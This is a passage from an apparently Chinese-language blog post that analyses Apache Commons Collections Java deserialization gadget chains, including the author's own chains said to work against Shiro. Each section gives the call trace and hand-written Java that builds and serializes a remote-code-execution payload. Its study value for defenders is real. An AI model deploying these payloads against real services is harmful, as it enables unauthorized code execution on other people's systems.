class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = tpl;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write queue</span></span><br></pre></td></tr></table></figure>

<p>这里用了一个小技巧是利用反射延迟设置 queue 内部的值，防止 <code>queue.add</code> 时利用链就被触发了。但这个成功反序列化后也会有个错误，原因是 Templeates 被实例化后是不可被比较的，我把利用链稍微调整了一下就可以规避这个问题，这个利用链支调整了最终 transform 的逻辑，核心触发逻辑没变，就不作为 2_1 来写了:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> MyGadget.createTemplate();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(tpl),</span><br><span class="line">    invokerTransformer,</span><br><span class="line">    <span class="comment">// 返回一个 constant 值，防止报错</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write queue</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><h2 id="依赖-3"><a href="#依赖-3" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &lt; 8u71</li>
</ul>
<h2 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">      AnnotationInvocationHandler.invoke()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">          <span class="comment">// 变的是下面这部分</span></span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InstantiateTransformer.transform()</span><br><span class="line">            	TrAXFilter()</span><br><span class="line">                TemplatesImpl.newTransformer()</span><br><span class="line">                  TemplatesTmpl.getTransletInstance()</span><br><span class="line">                    TemplatesTmpl.defineTransletClasses()</span><br><span class="line">                    TemplatesTmpl.newInstance()</span><br><span class="line">                      ClassInitializer()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>和 CommonCollectins1 的前半部分是一致的，所以依赖都是一致的。不同的是借助 <code>InstantiateTransformer</code> 和 <code>TrAXFilter</code> 这个链完成 TemplateImpl 的实例化，能利用的原因在于 <code>TrAXFilter</code> 这个类的实例化函数是这样的:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">	_templates = templates;</span><br><span class="line">	_transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>顺手可以手写一份利用代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> MyGadget.createTemplate();</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl&#125;),</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// chain 的触发和 1 一样，不再赘述</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="依赖-4"><a href="#依赖-4" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections4.0</li>
</ul>
<h2 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    ...</span><br><span class="line">      TransformingComparator.compare()</span><br><span class="line">        ChainedTransformer.transform()</span><br><span class="line">        <span class="comment">// 变的是下面这部分</span></span><br><span class="line">          ConstantTransformer.transform()</span><br><span class="line">          InstantiateTransformer.transform()</span><br><span class="line">          	TrAXFilter()</span><br><span class="line">              TemplatesImpl.newTransformer()</span><br><span class="line">                TemplatesTmpl.getTransletInstance()</span><br><span class="line">                  TemplatesTmpl.defineTransletClasses()</span><br><span class="line">                  TemplatesTmpl.newInstance()</span><br><span class="line">                    ClassInitializer()</span><br><span class="line">                      Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>这个就是 2 的后半部分用了 <code>InstantiateTransformer</code> ，和我自己写的那个只有一点点的不一样，不再赘述</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> MyGadget.createTemplate();</span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">initTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    constantTransformer,</span><br><span class="line">    initTransformer,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> constantTransformer.getClass().getDeclaredField(<span class="string">&quot;iConstant&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(constantTransformer, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">i = initTransformer.getClass().getDeclaredField(<span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(initTransformer, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line"></span><br><span class="line">i = initTransformer.getClass().getDeclaredField(<span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(initTransformer, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write queue</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><h2 id="依赖-5"><a href="#依赖-5" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &gt;&#x3D; 8u76</li>
<li>SecurityManager 未开启</li>
</ul>
<h2 id="利用链-5"><a href="#利用链-5" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    TiedMapEntry.toString()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                ConstantTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>这个 gadget 只能在 8u76 之后用，原因在于 8u76 为 BadAttributeValueExpException 添加了 readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时 TiedMap 的 <code>toString</code> 方法为，可以说是非常人性化了:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LazyMap 和 1 的是一样的</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chain);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(obj, <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, <span class="string">&quot;value&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write obj</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="依赖-6"><a href="#依赖-6" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
</ul>
<h2 id="利用链-6"><a href="#利用链-6" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.HashMap.readObject()</span><br><span class="line">    java.util.HashMap.hash()</span><br><span class="line">        TiedMapEntry.hashCode()</span><br><span class="line">        	TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>由于 5 有环境版本的要求，这个相当于是 5 的改进，不依赖版本了。利用链原理 <code>TiedMapEntry</code> 的 <code>hashcode</code> 方法可以结合 <code>HashMap</code> 利用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial 中这个 gadget 实现的很复杂，实际上可以简化 <a href="https://xz.aliyun.com/t/7157">参考</a>，完整链手写如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, execArgs),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;())&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">inertChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;String,String&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(innerMap, inertChain);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tied</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">outerMap.put(tied, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"><span class="comment">// 这个很关键</span></span><br><span class="line">innerMap.clear();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> inertChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(inertChain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(outerMap);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<p>这里有个细节很关键，就是 <code>innerMap.clear()</code> 这句，这并不是为了清空下缓存，而是如果没有这一句在反序列化时就不会触发了，原因是 LazyMap 中有这样的写法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有 clear，那么反序列化后的 map 是直接包含了 key 的，这里的 factory.transform 就中断了。为了方便使用，我把这条简化后的链命名为了 K3，见后面的部分。</p>
<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><h2 id="依赖-7"><a href="#依赖-7" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
</ul>
<h2 id="利用链-7"><a href="#利用链-7" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">  java.util.Hashtable.reconstitutionPut</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">      LazyMap.get()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">              ConstantTransformer.transform()</span><br><span class="line">              InvokerTransformer.transform()</span><br><span class="line">                  Method.invoke()</span><br><span class="line">                      Class.getMethod()</span><br><span class="line">              InvokerTransformer.transform()</span><br><span class="line">                  Method.invoke()</span><br><span class="line">                      Runtime.getRuntime()</span><br><span class="line">              InvokerTransformer.transform()</span><br><span class="line">                  Method.invoke()</span><br><span class="line">                      Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>这个原理基于三个小技巧:</p>
<ol>
<li>yy 和 zZ 这两个字符串的 hashcode() 是一样的</li>
<li>当向 hashtable 或 hashmap 中put时，如果 key 是一个 map，hashcode 的计算方法是这种方式:</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// java.util.AbstractMap#hashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">        h += i.next().hashCode();</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>当 key 为 map 类型并且发生了 hashcode 碰撞，会做深层次的比较:</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// java.util.AbstractMap#equals</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 这里会触发 lazymap 的 transform</span></span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, inertChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, inertChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> inertChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(inertChain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 6 中 innerMap.clear() 一个道理，需要清除 put 时的缓存，这样反序列化时才会产生冲突并触发 lazymap.get</span></span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"><span class="comment">// then write hashtable to file</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollectionsK1-K2"><a href="#CommonsCollectionsK1-K2" class="headerlink" title="CommonsCollectionsK1,K2"></a>CommonsCollectionsK1,K2</h1><h2 id="依赖-8"><a href="#依赖-8" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>K1: CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>K2: CommonsCollections &#x3D;&#x3D; 4.0</li>
</ul>
<h2 id="利用链-8"><a href="#利用链-8" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap.readObject</span><br><span class="line">    TiedMapEntry.hashCode</span><br><span class="line">     TiedMapEntry.getValue</span><br><span class="line">       LazyMap.decorate</span><br><span class="line">         InvokerTransformer</span><br><span class="line">           templates...</span><br></pre></td></tr></table></figure>

<h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p>这是我在做 shiro 检测时被迫组合出的一条利用链，这条链虽然是新瓶装旧酒——前半段类似 6，后半段类似 2，但完全避免了 <code>ChainedTransformer</code> 的使用且仅依赖于 CommonsCollections，最终效果是可以直接在 shiro 1.2.24 的环境中使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">HashMap&lt;String,String&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tied</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, tpl);</span><br><span class="line">outerMap.put(tied, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"><span class="comment">// 这个很关键</span></span><br><span class="line">innerMap.clear();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(transformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(outerMap);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<p>K2 与 K1 的差别，仅仅是将 lazyMap 改为了 4.0 中的写法，不再赘述。</p>
<h1 id="CommonsCollectionsK3-K4"><a href="#CommonsCollectionsK3-K4" class="headerlink" title="CommonsCollectionsK3,K4"></a>CommonsCollectionsK3,K4</h1><h2 id="依赖-9"><a href="#依赖-9" class="headerlink" title="依赖"></a>依赖</h2><ul>
